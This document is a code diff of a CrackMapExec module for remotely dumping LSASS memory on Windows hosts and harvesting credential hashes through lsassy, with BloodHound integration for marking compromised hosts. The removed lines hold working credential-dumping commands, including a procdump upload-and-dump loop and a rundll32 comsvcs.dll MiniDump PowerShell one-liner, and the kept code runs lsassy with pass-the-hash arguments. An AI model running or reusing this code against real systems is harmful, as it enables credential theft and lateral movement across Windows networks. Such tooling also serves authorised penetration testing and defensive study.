@@ -19,35 +19,30 @@ class CMEModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
-            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
-            SHARE               Share to upload procdump and dump lsass (default: C$)
+        """
+            METHOD              Method to use to dump procdump with lsassy. See lsassy -h for more details
+            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: Random)
             PROCDUMP_PATH       Path to procdump on attacker host. If this is not set, "rundll32" method is used
-            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
             BLOODHOUND          Enable Bloodhound integration (default: false)
             NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
             NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
             NEO4JUSER           Username for Neo4j database (default: 'neo4j')
             NEO4JPASS           Password for Neo4j database (default: 'neo4j')
             WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')
-        '''
+        """
 
-        self.tmp_dir = "\\Windows\\Temp\\"
-        self.share = "C$"
+        self.method = False
+        self.remote_lsass_dump = False
         self.procdump_path = False
-        self.remote_lsass_dump = "tmp.dmp"
 
-        if 'TMP_DIR' in module_options:
-            self.tmp_dir = module_options['TMP_DIR']
-
-        if 'SHARE' in module_options:
-            self.share = module_options['SHARE']
-
-        if 'PROCDUMP_PATH' in module_options:
-            self.procdump_path = module_options['PROCDUMP_PATH']
+        if 'METHOD' in module_options:
+            self.method = module_options['METHOD']
 
         if 'REMOTE_LSASS_DUMP' in module_options:
             self.remote_lsass_dump = module_options['REMOTE_LSASS_DUMP']
+
+        if 'PROCDUMP_PATH' in module_options:
+            self.procdump_path = module_options['PROCDUMP_PATH']
 
         self.bloodhound = False
         self.neo4j_URI = "127.0.0.1"
@@ -73,13 +68,6 @@ class CMEModule:
         if self.bloodhound:
             self.set_as_owned(context, connection)
 
-        if self.procdump_path:
-            self.procdump_dump(context, connection)
-        else:
-            self.dll_dump(context, connection)
-
-        context.log.success("Process lsass.exe was successfully dumped")
-
         """
         Since lsassy is py3.6+ and CME is still py2, lsassy cannot be
         imported. For this reason, connection information must be sent to lsassy
@@ -98,13 +86,17 @@ class CMEModule:
             domain_name, username, password, host
         )
 
-        command = r"lsassy -j -q --hashes {}:{} --dumppath '{}{}' '{}'".format(
+        command = r"lsassy -j -q --hashes {}:{} '{}'".format(
             lmhash,
             nthash,
-            self.share,
-            os.path.join(self.tmp_dir, self.remote_lsass_dump).replace("\\", "/"),
             py_arg
         )
+
+        if self.method:
+            command += " -m {}".format(self.method)
+
+        if self.remote_lsass_dump:
+            command += " --dumpname {}".format(self.remote_lsass_dump)
 
         # Parsing lsass dump remotely
         context.log.info('Parsing dump file with lsassy')
@@ -120,77 +112,6 @@ class CMEModule:
             context.log.debug('{}'.format(out))
             context.log.debug('-----   end output  -----')
             self.process_credentials(context, connection, out)
-
-        self.clean(context, connection)
-
-    def procdump_dump(self, context, connection):
-        # Verify procdump exists on host
-        if not os.path.exists(self.procdump_path):
-            context.log.error("{} does not exist.".format(self.procdump_path))
-            exit()
-
-        # Upload procdump
-        context.log.debug('Copy {} to {}'.format(self.procdump_path, self.tmp_dir))
-        with open(self.procdump_path, 'rb') as procdump:
-            try:
-                connection.conn.putFile(self.share, self.tmp_dir + "procdump.exe", procdump.read)
-                context.log.debug('Uploaded procdump.exe on the \\\\{}{}'.format(self.share, self.tmp_dir))
-            except Exception as e:
-                context.log.error('Error writing file to share {}: {}'.format(self.share, e))
-                self.clean(context, connection)
-                exit()
-
-        # Dump lsass remotely
-        # Dump using lsass PID
-        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}procdump.exe -accepteula -o -ma ^%B {}{}""".format(
-            self.tmp_dir, self.tmp_dir, self.remote_lsass_dump)
-        context.log.debug('Dumping lsass.exe')
-        p = connection.execute(command, True)
-        context.log.debug(p)
-
-        if 'Dump 1 complete' in p:
-            # Procdump ended
-            context.log.debug('Procdump output fully retrieved')
-        elif 'Dump 1 ini' in p:
-            # Procdump output not fully retrieved
-            context.log.debug('Procdump output partially retrieved')
-            # Since we cannot know when the dump finishes, we wait for 5s
-            time.sleep(2)
-        elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
-            context.log.error(
-                'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
-            )
-            self.clean(context, connection)
-            exit()
-        else:
-            context.log.debug(
-                'Unknown error while dumping lsass, try CME with --verbose to see details. Trying anyway.')
-
-    def dll_dump(self, context, connection):
-        """
-        Thanks to TiM0 for this trick. Admin Powershell has debug privilege, so we don't need SYSTEM to use the rundll32 technique
-        """
-        command = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
-            self.tmp_dir, self.remote_lsass_dump)
-        connection.execute(command, True)
-        # We have to wait for the dump to be finished. We do not have any information on when
-        #time.sleep(2)
-
-    def clean(self, context, connection):
-        # Delete lsass dump
-        try:
-            connection.conn.deleteFile(self.share, self.tmp_dir + self.remote_lsass_dump)
-            context.log.success('Deleted lsass dump')
-        except Exception as e:
-            context.log.error('Error deleting lsass dump : {}'.format(e))
-
-        if self.procdump_path:
-            # Delete procdump.exe
-            try:
-                connection.conn.deleteFile(self.share, self.tmp_dir + "procdump.exe")
-                context.log.success('Deleted procdump.exe')
-            except Exception as e:
-                context.log.error('Error deleting procdump.exe : {}'.format(e))
 
     @staticmethod
     def run(cmd):
@@ -233,7 +154,10 @@ class CMEModule:
         context.log.highlight(output)
 
     def set_as_owned(self, context, connection):
-        from neo4j.v1 import GraphDatabase
+        try:
+            from neo4j.v1 import GraphDatabase
+        except:
+            from neo4j import GraphDatabase
         from neo4j.exceptions import AuthError, ServiceUnavailable
         host_fqdn = (connection.hostname + "." + connection.domain).upper()
         uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)
@@ -263,7 +187,10 @@ class CMEModule:
         driver.close()
 
     def bloodhound_analysis(self, context, connection, username):
-        from neo4j.v1 import GraphDatabase
+        try:
+            from neo4j.v1 import GraphDatabase
+        except:
+            from neo4j import GraphDatabase
         from neo4j.exceptions import AuthError, ServiceUnavailable
         username = (username + "@" + connection.domain).upper().replace("\\", "\\\\")
         uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)
